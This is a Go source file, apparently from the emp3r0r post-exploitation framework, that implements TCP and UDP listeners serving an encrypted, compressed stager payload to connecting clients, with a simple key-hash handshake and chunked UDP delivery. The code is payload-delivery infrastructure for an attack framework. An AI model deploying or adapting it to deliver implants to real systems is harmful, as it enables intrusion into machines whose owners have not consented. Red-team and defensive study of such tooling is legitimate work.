package listener

import (
	"encoding/binary"
	"fmt"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"net"
	"os"
	"sync"
	"time"
)

var (
	udpSessions      = make(map[string]chan uint32)
	udpSessionsMutex sync.Mutex
)

// TCPAESCompressedListener serves the encrypted stager file over raw TCP.
// stagerPath: the path to the stager file to serve.
// port: the port to serve the stager file on.
// keyStr: the passphrase to encrypt the stager file.
// compression: whether to compress the stager file before encryption.
func TCPAESCompressedListener(stagerPath string, port string, keyStr string, compression bool) error {
	stager, err := os.ReadFile(stagerPath)
	if err != nil {
		return fmt.Errorf("failed to read stager file: %v", err)
	}

	key := deriveKeyFromString(keyStr)

	var toEncrypt []byte
	if compression {
		toEncrypt = compressData(stager)
	} else {
		toEncrypt = stager
	}
	encryptedStager := encryptData(toEncrypt, key)

	listener, err := net.Listen("tcp", fmt.Sprintf(":%s", port))
	if err != nil {
		return fmt.Errorf("failed to start TCP listener: %v", err)
	}
	defer listener.Close()

	logging.Printf("TCP listener started on port %s", port)

	for {
		conn, err := listener.Accept()
		if err != nil {
			logging.Printf("Failed to accept connection: %v", err)
			continue
		}

		go handleTCPConnection(conn, encryptedStager)
	}
}

func handleTCPConnection(conn net.Conn, data []byte) {
	defer conn.Close()
	logging.Printf("TCP connection from %s", conn.RemoteAddr())

	// Send the encrypted data
	_, err := conn.Write(data)
	if err != nil {
		logging.Printf("Failed to send data to %s: %v", conn.RemoteAddr(), err)
		return
	}

	logging.Printf("Sent %d bytes to %s", len(data), conn.RemoteAddr())
}

// TCPBareListener serves the stager file over raw TCP without encryption or compression.
func TCPBareListener(stagerPath string, port string) error {
	stager, err := os.ReadFile(stagerPath)
	if err != nil {
		return fmt.Errorf("failed to read stager file: %v", err)
	}

	listener, err := net.Listen("tcp", fmt.Sprintf(":%s", port))
	if err != nil {
		return fmt.Errorf("failed to start TCP listener: %v", err)
	}
	defer listener.Close()

	logging.Printf("TCP listener (bare) started on port %s", port)

	for {
		conn, err := listener.Accept()
		if err != nil {
			logging.Printf("Failed to accept connection: %v", err)
			continue
		}

		go handleTCPConnection(conn, stager)
	}
}

// UDPAESCompressedListener serves the encrypted stager file over UDP.
// stagerPath: the path to the stager file to serve.
// port: the port to serve the stager file on.
// keyStr: the passphrase to encrypt the stager file.
// compression: whether to compress the stager file before encryption.
func UDPAESCompressedListener(stagerPath string, port string, keyStr string, compression bool) error {
	stager, err := os.ReadFile(stagerPath)
	if err != nil {
		return fmt.Errorf("failed to read stager file: %v", err)
	}

	key := deriveKeyFromString(keyStr)

	var toEncrypt []byte
	if compression {
		toEncrypt = compressData(stager)
	} else {
		toEncrypt = stager
	}
	encryptedStager := encryptData(toEncrypt, key)

	addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf(":%s", port))
	if err != nil {
		return fmt.Errorf("failed to resolve UDP address: %v", err)
	}

	conn, err := net.ListenUDP("udp", addr)
	if err != nil {
		return fmt.Errorf("failed to start UDP listener: %v", err)
	}
	defer conn.Close()

	logging.Printf("UDP listener started on port %s", port)

	// Calculate key hash for authentication
	keyHash := uint32(0)
	for i := 0; i < len(key); i++ {
		keyHash ^= uint32(key[i]) << ((i % 4) * 8)
	}

	buffer := make([]byte, 2048) // Buffer for incoming packets
	for {
		n, remoteAddr, err := conn.ReadFromUDP(buffer)
		if err != nil {
			logging.Printf("Failed to read from UDP: %v", err)
			continue
		}

		if n < 5 {
			continue
		}

		packetType := buffer[0]
		payload := buffer[1:n]

		if packetType == 0x02 { // Hello
			if len(payload) < 4 {
				continue
			}
			receivedHash := binary.LittleEndian.Uint32(payload[:4])
			if receivedHash == keyHash {
				logging.Printf("Authenticated request from %s", remoteAddr)

				udpSessionsMutex.Lock()
				if _, exists := udpSessions[remoteAddr.String()]; !exists {
					ackChan := make(chan uint32, 10)
					udpSessions[remoteAddr.String()] = ackChan
					go handleUDPConnection(conn, remoteAddr, encryptedStager, ackChan)
				}
				udpSessionsMutex.Unlock()
			} else {
				logging.Printf("Authentication failed from %s (hash mismatch)", remoteAddr)
			}
		} else if packetType == 0x01 { // ACK
			if len(payload) < 4 {
				continue
			}
			seq := binary.LittleEndian.Uint32(payload[:4])

			udpSessionsMutex.Lock()
			if ch, exists := udpSessions[remoteAddr.String()]; exists {
				select {
				case ch <- seq:
				default:
				}
			}
			udpSessionsMutex.Unlock()
		}
	}
}

func handleUDPConnection(conn *net.UDPConn, addr *net.UDPAddr, data []byte, ackChan chan uint32) {
	defer func() {
		udpSessionsMutex.Lock()
		delete(udpSessions, addr.String())
		udpSessionsMutex.Unlock()
		close(ackChan)
	}()

	const chunkSize = 1024
	const headerSize = 5 // Type(1) + Seq(4)

	totalPackets := (len(data) + chunkSize - 1) / chunkSize

	for i := 0; i < totalPackets; i++ {
		start := i * chunkSize
		end := start + chunkSize
		if end > len(data) {
			end = len(data)
		}

		chunk := data[start:end]
		packet := make([]byte, headerSize+len(chunk))
		packet[0] = 0x00 // Data type
		binary.LittleEndian.PutUint32(packet[1:5], uint32(i))
		copy(packet[5:], chunk)

		// Send with retry
		maxRetries := 10
		retryCount := 0

		for retryCount < maxRetries {
			_, err := conn.WriteToUDP(packet, addr)
			if err != nil {
				logging.Printf("Failed to send UDP chunk to %s: %v", addr, err)
				return
			}

			// Wait for ACK
			timeout := time.NewTimer(500 * time.Millisecond)
			select {
			case ackSeq := <-ackChan:
				if ackSeq == uint32(i) {
					timeout.Stop()
					goto NextPacket
				}
				// Ignore old ACKs
			case <-timeout.C:
				retryCount++
			}
		}
		logging.Printf("Max retries reached for packet %d to %s", i, addr)
		return

	NextPacket:
	}

	// Send end marker (Data packet with empty payload)
	endPacket := make([]byte, headerSize)
	endPacket[0] = 0x00
	binary.LittleEndian.PutUint32(endPacket[1:5], uint32(totalPackets))

	for i := 0; i < 5; i++ {
		conn.WriteToUDP(endPacket, addr)
		timeout := time.NewTimer(500 * time.Millisecond)
		select {
		case ackSeq := <-ackChan:
			if ackSeq == uint32(totalPackets) {
				timeout.Stop()
				logging.Printf("Sent %d bytes to %s (Completed)", len(data), addr)
				return
			}
		case <-timeout.C:
		}
	}
}
